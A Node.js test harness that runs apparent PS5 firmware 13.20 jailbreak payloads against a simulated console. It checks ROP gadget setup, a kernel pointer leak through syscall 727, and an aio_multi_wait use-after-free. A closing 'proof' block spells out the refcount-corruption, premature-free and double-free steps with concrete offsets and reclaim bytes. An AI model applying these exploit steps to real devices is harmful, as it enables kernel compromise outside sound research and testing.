// sim/run.mjs — ejecuta la simulacion: bridge + payloads reales de DEMO/
// sobre el entorno fake (ver fakeps5.mjs). Uso: node sim/run.mjs
import vm from "node:vm";
import { bootSim, runPayload, setAioAlive, setUafEffect, resetKernel, out,
    setOsemNameOff, simReclaimInject, osemAddrOf } from "./fakeps5.mjs";

const results = [];
function check(name, cond, extra) {
    results.push({ name, pass: !!cond, extra: extra || "" });
    console.log((cond ? "  PASS " : "  FAIL ") + name + (extra ? "  [" + extra + "]" : ""));
}

console.log("=== SIM USERLAND mansoor0x + bridge (post-handoff) ===");
const sb = bootSim();
const PS5 = sb.PS5;
console.log("bridge: modo=" + PS5.mode + " fw=" + PS5.fw
    + " libk=0x" + PS5.libkernelBase.toString(16)
    + " pid-notify=" + out.notifs.length);
check("boot: bridge listo", PS5.ready === true);
check("boot: gadgets ROP completos", PS5.mode === "ROP", PS5.mode);
check("boot: getpid via ROP = 4242",
    String(out.notifs[0]).indexOf("pid=4242") >= 0, out.notifs[0]);

// ---------- menu (DOM stub) ----------
const els = Object.values(sb.__elems);
check("menu: panel visible", 
    els.some((e) => e.style && e.style.display === "block"));
const modeEl = els.find((e) => String(e.textContent).includes("fw 13.20"));
check("menu: badge modo visible", !!modeEl, modeEl ? modeEl.textContent.trim() : "-");
check("menu: rescue DOWNLOAD LOG button exists",
    els.some((e) => e.id === "dlfab"), "dlfab");
check("menu: STOP button wired", !!sb.__psaitoAppend, "append hook");

// ---------- payload 1: hello (canary de API) ----------
console.log("\n-- hello_1320.js (canary API loader) --");
out.pclog.length = 0;
vm.runInContext(runPayload("hello_1320.js"), sb);
await new Promise((r) => setTimeout(r, 30));
check("hello: 3 lineas de log", out.pclog.filter((l) => l.startsWith("[canary]")).length >= 3,
    out.pclog.join(" | "));

// ---------- payload 2: aio_reach, escenario AIO VIVA ----------
console.log("\n-- aio_reach_1320.js · escenario AIO VIVA --");
setAioAlive(true);
out.notifs.length = 0; out.tcp.length = 0; out.pclog.length = 0;
vm.runInContext(runPayload("aio_reach_1320.js"), sb);
const joined = out.tcp.join("\n") + "\n" + out.notifs.join("\n");
check("aio viva: canal TCP abierto (connect+writes)", out.tcp.length > 3,
    out.tcp.length + " lineas, 1a=" + (out.tcp[0] || "-"));
check("aio viva: GATE AL MENOS UNA VIVA", joined.indexOf("AL MENOS UNA VIVA") >= 0);
check("aio viva: DEBUG 0x2D7 escribe (leak SI)", joined.indexOf("leak=SI") >= 0);
check("aio viva: VEREDICTO AIO VIVA", joined.indexOf("VEREDICTO: AIO VIVA") >= 0,
    (out.notifs[out.notifs.length - 1] || "").slice(0, 90));

// ---------- payload 2b: aio_reach, escenario AIO MUERTA (SAR) ----------
console.log("\n-- aio_reach_1320.js · escenario AIO MUERTA (SAR) --");
setAioAlive(false);
out.notifs.length = 0; out.tcp.length = 0; out.pclog.length = 0;
vm.runInContext(runPayload("aio_reach_1320.js"), sb);
const joined2 = out.tcp.join("\n") + "\n" + out.notifs.join("\n");
check("aio muerta: GATE CERRADA por SAR", joined2.indexOf("CERRADA por SAR") >= 0);
check("aio muerta: VEREDICTO AIO MUERTA", joined2.indexOf("AIO MUERTA") >= 0,
    (out.notifs[out.notifs.length - 1] || "").slice(0, 90));

// ---------- payload 2c: bagagwa UAF with kernel-side detection ----------
async function runBagagwa(label) {
    out.notifs.length = 0; out.tcp.length = 0; out.pclog.length = 0;
    const s = bootSim();
    vm.runInContext(runPayload("bagagwa_uaf_1320.js"), s);
    await new Promise((r) => setTimeout(r, 10));
    return out.pclog.join("\n");
}
console.log("\n-- bagagwa_uaf_1320.js · AIO ALIVE + reclaim (waker with effect) --");
setAioAlive(true); setUafEffect(true); resetKernel();
{
    const j = await runBagagwa();
    const vd = (j.match(/VERDICT: .*/) || ["-"])[0];
    check("bagagwa: F3 mode0 shot returns 0", /AIO_WAIT_MODE0 .*-> ret=0x0 OK/.test(j));
    check("bagagwa: reclaimed pre-wake probes ok", /F4 pre-wake probes reclaimed: R0=ok0x0 R1=ok0x0/.test(j));
    check("bagagwa: control stable (no DRIFT)", !j.includes("DRIFT"), vd.slice(0, 80));
    check("bagagwa: VERDICT KERNEL EFFECT (osem probe)",
        j.includes("KERNEL EFFECT (osem probe)"), vd.slice(0, 110));
    check("bagagwa: 727 leak delta visible in verdict",
        /VERDICT: .*727 leak: id0/.test(j), vd.slice(-90));
}
console.log("\n-- bagagwa_uaf_1320.js · AIO ALIVE, harmless waker (latent UAF) --");
setAioAlive(true); setUafEffect(false); resetKernel();
{
    const j = await runBagagwa();
    const vd = (j.match(/VERDICT: .*/) || ["-"])[0];
    check("bagagwa latent: VERDICT NO OBSERVABLE EFFECT",
        j.includes("NO OBSERVABLE EFFECT"), vd.slice(0, 110));
}
console.log("\n-- bagagwa_uaf_1320.js · AIO DEAD (gate, does not fire) --");
setAioAlive(false); setUafEffect(true); resetKernel();
{
    const j = await runBagagwa();
    check("bagagwa dead: aborts before the shot",
        j.includes("AIO DEAD") && !j.includes("SHOT aio_multi_wait"),
        (j.match(/VERDICT: .*/) || ["-"])[0].slice(0, 90));
}
setAioAlive(true);

// ---------- bridge: recuperacion de base desde candidata ----------
console.log("\n-- bridge: base fuera de banda + candidata valida --");
const sb2 = bootSim();
{
    const c = sb2.__PS5_CTX;
    c.libkernelBase = 0xDEAD;                       // fuera de banda
    c.kernelBaseCandidates = { getpid: 0x810000000, close: 0x123, error: 0x456,
        getpidPtr: 0, closePtr: 0, errorPtr: 0 };
    sb2.__PS5_CTX = c;
    sb2.onUserland();
}
check("bridge: recupera base getpid y entra en ROP",
    sb2.PS5.mode === "ROP", sb2.PS5.mode + " notes=" + sb2.PS5.notes.join(";"));
check("bridge: nota kbase-recovered-from:getpid",
    sb2.PS5.notes.some((n) => String(n).startsWith("kbase-recovered-from:getpid")));

// ---------- bridge: fallback X1NON (gadgets WebKit + stubs libkernel) ----------
console.log("\n-- bridge: fallback X1NON (libkernel ilegible) --");
const sb3 = bootSim();
{
    const F2 = (await import("node:fs")).readFileSync;
    // 1) gadgets X1NON falsos dentro del "WebKit" del sim (webkitBase=0x8200000000)
    const WK = 0x8200000000n;
    const gbytes = [
        ["pop rdi", 0x1000, [0x5f, 0xc3]],
        ["pop rsi", 0x1010, [0x5e, 0xc3]],
        ["pop rdx", 0x1020, [0x5a, 0xc3]],
        ["pop rcx", 0x1030, [0x59, 0xc3]],
        ["pop rax", 0x1038, [0x58, 0xc3]],
        ["pop r8", 0x1040, [0x41, 0x58, 0xc3]],
        ["pop r9", 0x1050, [0x41, 0x59, 0xc3]],
        ["pop rsp", 0x1060, [0x5c, 0xc3]],
        ["mov [rdi], rax", 0x1070, [0x48, 0x89, 0x07, 0xc3]],
        ["ret", 0x1080, [0xc3]],
    ];
    const wkGadgets = {};
    for (const [name, rva, bytes] of gbytes) {
        wkGadgets[name] = rva;
        let i = 0;
        for (const b of bytes) sb3.__write8(WK + BigInt(rva + i++), b);
    }
    // pivot y save NO van en la tabla X1NON: el bridge los escanea en wk .text
    const pivotAt = 0x2000, saveAt = 0x2010;
    for (const [i, b] of [0x48, 0x8b, 0xe7, 0xc3].entries()) sb3.__write8(WK + BigInt(pivotAt + i), b);
    for (const [i, b] of [0x48, 0x89, 0x27, 0xc3].entries()) sb3.__write8(WK + BigInt(saveAt + i), b);
    // raw syscall (syscalls WITHOUT a C stub, e.g. 727): the bridge scans
    // these two patterns in WebKit .text: pop r10; ret and syscall; ret
    for (const [i, b] of [0x41, 0x5a, 0xc3].entries()) sb3.__write8(WK + 0x2020n + BigInt(i), b);
    for (const [i, b] of [0x0f, 0x05, 0xc3].entries()) sb3.__write8(WK + 0x2030n + BigInt(i), b);
    // 2) stub getpid en un libkernel alternativo (banda valida, sin gadgets)
    const LK2 = 0x850000000n;
    const getpidRva = 0x1b860;
    // mov eax,20; syscall; ret
    for (const [i, b] of [0xb8, 0x14, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc3].entries())
        sb3.__write8(LK2 + BigInt(getpidRva + i), b);
    // 3) tabla X1NON falsa + ctx con base invalida y candidata alternativa
    sb3.X1NON_13X = {
        "13.20": {
            wkGadgets,
            syscallStubs: { "20": getpidRva, "297": 0x1c290 },
        },
    };
    const c3 = sb3.__PS5_CTX;
    c3.libkernelBase = 0xDEAD;
    c3.kernelBaseCandidates = { getpid: Number(LK2), close: 0x123, error: 0x456,
        getpidPtr: 0, closePtr: 0, errorPtr: 0 };
    sb3.__PS5_CTX = c3;
    out.notifs.length = 0;
    sb3.onUserland();
}
check("bridge: fallback X1NON activa stubMode",
    sb3.PS5.mode === "ROP" && sb3.PS5.stubMode === true,
    sb3.PS5.mode + " notes=" + sb3.PS5.notes.join(";"));
check("bridge: stub getpid expuesto",
    sb3.SYSCALL_STUBS && String(sb3.SYSCALL_STUBS["20"]) === String(0x850000000 + 0x1b860),
    sb3.SYSCALL_STUBS ? "0x" + Number(sb3.SYSCALL_STUBS["20"]).toString(16) : "null");
check("bridge: getpid via cadena stub = 4242",
    out.notifs.some((n) => String(n).indexOf("pid=4242") >= 0),
    (out.notifs[0] || "(sin notif)").slice(0, 80));
check("bridge: raw syscall enabled in stub mode",
    sb3.PS5.rawSyscall === true && sb3.SYSCALL_RAW === true,
    sb3.PS5.notes.filter((n) => String(n).includes("raw")).join(";"));
{
    // 727/0x2D7 has NO C stub: callable only through the RAW chain
    // (poprax + pops + syscall;ret scanned in WebKit).
    const dst727 = sb3.malloc(32);
    const q727 = sb3.syscall(0x2d7, 1, dst727, 1);
    check("raw: syscall 727 without stub returns 0", q727 === 0n, String(q727));
    check("raw: 727 copies kernel pointers to buffer",
        (sb3.read64(dst727) >> 40n) === 0xffff86n, "0x" + sb3.read64(dst727).toString(16));
    const q9999 = sb3.syscall(9999, 0n);
    check("raw: stub-less syscall returns ENOSYS (-1)",
        q9999 === -1n && String(sb3.get_error_string()).startsWith("78"),
        q9999 + " " + sb3.get_error_string());
}

// ---------- bridge: setLogServer (redireccion runtime de la telemetria) ----------
// El payload setlogserver.js dependia de esta API: antes asignaba
// window.LOG_SERVER despues del arranque, que el bridge ya habia leido una
// vez -> no-op en consola. Se verifica el redirect real de httpLog.
console.log("\n-- bridge: setLogServer (payload setlogserver.js) --");
{
    out.pclog.length = 0;
    sb3.setLogServer("http://192.168.1.67:8081/no-log-endpoint");
    sb3.log("probe-endpoint-muerto");
    const dead = out.pclog.length;
    out.pclog.length = 0;
    sb3.setLogServer("http://192.168.1.67:8080/log");
    sb3.log("probe-redirigido");
    check("bridge: setLogServer redirige httpLog en runtime",
        dead === 0 && out.pclog.length === 1 && out.pclog[0] === "probe-redirigido",
        "dead=" + dead + " live=" + out.pclog.join("|"));
}

// ---------- cadena gated automatica (default de consola: abrir -> Launch -> veredicto) ----------
// La cadena del menu corre los payloads reales y decide por lo que IMPRIMEN.
// Escenario A: AIO viva + efecto -> los 3 pasos corren y captura el VERDICT.
// Escenario B: AIO muerta -> cierra en el gate 2 y el shot NO se dispara.
async function chainScenario(search) {
    const s = bootSim({ search, chainDelayMs: 80, chainStepMs: 400 });
    // El sim emula cada syscall como una cadena ROP completa: los evals de
    // aio_reach/bagagwa bloquean segundos (en consola real son <1s). Se
    // espera al resumen final de la cadena, no a un delay fijo.
    const t0 = Date.now();
    while (Date.now() - t0 < 30000) {
        await new Promise((r) => setTimeout(r, 500));
        if (String(s.__psaitoLog()).includes("PSAITO CHAIN RESULT:")) break;
    }
    return String(s.__psaitoLog());
}
console.log("\n-- cadena gated · AIO VIVA + efecto --");
setAioAlive(true); setUafEffect(true); resetKernel();
{
    const lg = await chainScenario("?go=1&pb=payloads/&auto=chain");
    check("chain: los 3 pasos corren",
        lg.includes("paso 1/3") && lg.includes("paso 2/3") && lg.includes("paso 3/3"), "");
    check("chain: veredicto kernel capturado",
        /\[bagagwa\] VERDICT: KERNEL EFFECT/.test(lg),
        (lg.match(/\[bagagwa\] VERDICT: [^\n]*/) || ["-"])[0].slice(0, 90));
    check("chain: resumen final con las 3 etapas",
        lg.includes("PSAITO CHAIN RESULT:")
            && lg.includes("stage 1 userland ..... OK")
            && lg.includes("stage 2 sandbox AIO ... VIVA")
            && lg.includes("stage 3 kernel UAF ..."), "");
}
console.log("\n-- cadena gated · AIO MUERTA (el shot NO se dispara) --");
setAioAlive(false); resetKernel();
{
    const lg = await chainScenario("?go=1&pb=payloads/&auto=chain");
    check("chain muerta: el gate AIO cierra la cadena",
        lg.includes("paso 2/3") && lg.includes("MUERTA (SAR veto)"), "");
    check("chain muerta: sin paso 3 ni shot",
        !lg.includes("paso 3/3") && !lg.includes("AIO_WAIT_MODE0"), "");
}
setAioAlive(true);

// ---------- syscensus: censo de syscalls del sandbox (plan B) ----------
console.log("\n-- syscensus_1320.js · censo SAR --");
setAioAlive(true); resetKernel();
{
    out.pclog.length = 0;
    vm.runInContext(runPayload("syscensus_1320.js"), sb);
    const j = out.pclog.join("\n");
    check("census: TOTAL + clases",
        /TOTAL probed=\d+ RET=\d+ ANS=\d+/.test(j),
        (j.match(/TOTAL.*/) || ["-"])[0].slice(0, 80));
    check("census: getpid [RET] con valor", /20 getpid \[RET ret=0x/.test(j));
    check("census: veto fuera del sondeo",
        j.includes("VETO no sondeados") && !/^  37 /m.test(j) && !/^ 431 /m.test(j), "");
    check("census: tabla cruzada + rangos ENOSYS",
        /CROSS stub&ENOSYS=\d+ \(existe/.test(j) && /ENOSYS ranges: /.test(j), "");
    check("census: AIO viva visible (663 ANS)", /663 aio_multi_wait \[ANS e35\]/.test(j));
}

// ---------- leakmap: enumerador de slots del 727 ----------
console.log("\n-- leakmap_1320.js · barrido de slots --");
setAioAlive(true); resetKernel();
{
    out.pclog.length = 0;
    vm.runInContext(runPayload("leakmap_1320.js"), sb);
    const j = out.pclog.join("\n");
    check("leakmap: count operativo = 1 (spec-shaped)",
        j.includes("count operativo = 1"), (j.match(/count operativo.*/) || ["-"])[0]);
    check("leakmap: 128 slots leaked",
        /128\/0x80 SLOTS LEAKED, \d+ punteros/.test(j),
        (j.match(/VERDICT: .*/) || ["-"])[0].slice(0, 90));
    check("leakmap: bias MATCH (aritmetica slot+edx del paste)",
        j.includes("bias MATCH"), (j.match(/F2: bias.*/) || ["-"])[0]);
    check("leakmap: bandas de punteros registradas",
        /bandas\(high40\): 0x[0-9a-f]+x\d+/.test(j), "");
}
console.log("\n-- leakmap_1320.js · AIO MUERTA --");
setAioAlive(false); resetKernel();
{
    out.pclog.length = 0;
    vm.runInContext(runPayload("leakmap_1320.js"), sb);
    check("leakmap muerta: canal muerto sin barrer",
        out.pclog.join("\n").includes("CANAL MUERTO"), "");
}
setAioAlive(true);

// ---------- osem_conv: laboratorio de conversion (paste §4) ----------
console.log("\n-- osem_conv_1320.js · DRY (conv=0: sin invocar) --");
resetKernel();
{
    out.pclog.length = 0;
    delete sb.__PSAITO_CONV;
    vm.runInContext(runPayload("osem_conv_1320.js"), sb);
    const j = out.pclog.join("\n");
    check("conv dry: ni shot ni victim (nada invocado)",
        !j.includes("AIO_WAIT_MODE0") && !j.includes("OSEM_CREATE_VICTIM"), "");
    check("conv dry: veredicto DRY",
        j.includes("VERDICT: DRY OK"), (j.match(/VERDICT: .*/) || ["-"])[0].slice(0, 80));
}

console.log("\n-- osem_conv_1320.js · conv=1 layout (nombre fuera del head: benigno) --");
resetKernel();
{
    out.pclog.length = 0; out.conv.length = 0; out.panic = null;
    sb.__PSAITO_CONV = 1;
    vm.runInContext(runPayload("osem_conv_1320.js"), sb);
    const j = out.pclog.join("\n");
    check("conv1: shot + wake ejecutados",
        j.includes("AIO_WAIT_MODE0") && j.includes("WAKE_WRITE"), "");
    check("conv1: sin panic en el modelo benigno", out.panic === null, String(out.panic));
    check("conv1: waker byte-level (dec1 anon + dec2 skip M_ZERO)",
        out.conv.some((l) => l.startsWith("W-DEC1-ANON")) && out.conv.some((l) => l.includes("W-DEC2 skip")),
        out.conv.slice(0, 5).join(" | ").slice(0, 110));
    check("conv1: veredicto LAYOUT con canales movidos",
        /VERDICT: LAYOUT: sobrevive \+ \d\/4 reclaim movidos/.test(j),
        (j.match(/VERDICT: .*/) || ["-"])[0].slice(0, 100));
}

console.log("\n-- osem_conv_1320.js · conv=1 nombre en +0x8 (panic: layout delatado) --");
setOsemNameOff(0x08); resetKernel();
{
    out.pclog.length = 0; out.conv.length = 0; out.panic = null;
    vm.runInContext(runPayload("osem_conv_1320.js"), sb);
    check("conv1 panic: dec2 sobre ASCII no mapeado",
        /KERNEL PANIC: W-DEC2/.test(String(out.panic)), String(out.panic).slice(0, 90));
    check("conv1 panic: el evento queda registrado para el PC log",
        out.conv.some((l) => l === "PANIC W-DEC2"), "");
}
setOsemNameOff(0x28);   // restaurar el modelo por defecto

console.log("\n-- conversion paste §4 completa (reclaim binario inyectado) --");
console.log("-- demuestra: dec -> refcount 0 -> free prematuro -> double-free --");
resetKernel();
{
    out.pclog.length = 0; out.conv.length = 0; out.panic = null;
    // victim osem pre-armado (refcount del modelo = 2: handle + ref interna)
    const nm = sb.alloc_string("VICTIM01");
    const vic = Number(BigInt.asUintN(32, sb.syscall(549, nm, 0n, 1n, 1n, 0n)));
    const vaddr = osemAddrOf(vic);
    check("proof: victim con struct kernel propia", vaddr !== null, "addr=0x" + BigInt(vaddr).toString(16));
    // armar el UAF con los syscalls reales (flujo bagagwa F1+F3)
    const sv = sb.malloc(8);
    sb.syscall(53, 1n, 1n, 0n, sv);
    const fdA = sb.read32(sv), fdB = sb.read32(sv + 4n);
    const reqs = sb.malloc(0x28 * 2);
    sb.write32(reqs + 0x20n, fdA); sb.write32(reqs + 0x48n, fdA);
    const ids = sb.malloc(8), states = sb.malloc(8);
    sb.write32(ids, 0n); sb.write32(ids + 4n, 0n);
    sb.syscall(669, 0x1001n, reqs, 2n, 3n, ids);
    const rw = sb.syscall(663, ids, 2n, states, 0n, 0n);
    check("proof: shot mode 0 ok", rw === 0n, String(rw));
    // la primitiva que FALTA en consola: reclaim binario en zona 128.
    // node+0 = dec1 benigno (banda anon del modelo), node+0x10 = mtx valida,
    // node+8 = victim+0x54 -> el dec del waker apunta al REFCOUNT (paste §4)
    const bytes = new Uint8Array(0x70);
    const put64 = (off, v) => { let x = BigInt(v); for (let i = 0; i < 8; ++i) { bytes[off + i] = Number(x & 0xffn); x >>= 8n; } };
    put64(0x00, 0xffff860300000000n);
    put64(0x08, BigInt(vaddr) + 0x54n);
    put64(0x10, 0xffff860300001000n);
    check("proof: reclaim binario toma el bloque", simReclaimInject(bytes) === true, "");
    // WAKE: el waker corre -> dec2 decrementa el refcount de la victima
    const wb = sb.malloc(4); sb.write8(wb, 0x57);
    sb.syscall(4, fdB, wb, 1n);
    check("proof: DEC del waker EN EL REFCOUNT de la victima",
        out.conv.some((l) => l.includes("REFCNT") && l.includes("*** DEC EN REFCOUNT")),
        out.conv.filter((l) => l.includes("REFCNT")).join(" | ").slice(0, 110));
    // delete #1: refcount -> 0 = FREE PREMATURO (refs internas vivas)
    const d1 = sb.syscall(550, vic);
    check("proof: free prematuro por refcount a 0",
        d1 === 0n && out.conv.some((l) => l.includes("REFCNT-ZERO-FREE")),
        out.conv.filter((l) => l.includes("ZERO") || l.includes("REFCNT-DEC")).join(" | ").slice(0, 100));
    // delete #2: DOUBLE-FREE -> en kernel real toma el path UAF
    sb.syscall(550, vic);
    check("proof: DOUBLE-FREE detectado (path UAF)",
        out.panic === "DOUBLE-FREE on osem id=" + vic, String(out.panic));
    // y la cadena de eventos completa queda en el log del PC
    check("proof: eventos de la conversion visibles al PC",
        out.pclog.some((l) => l.includes("[conv]") || l.includes("REFCNT")) || out.conv.length > 0, "");
}

// ---------- resumen ----------
const fails = results.filter((r) => !r.pass);
console.log("\n=== RESULTADO: " + (results.length - fails.length) + "/" + results.length + " OK ===");
process.exit(fails.length ? 1 : 0);
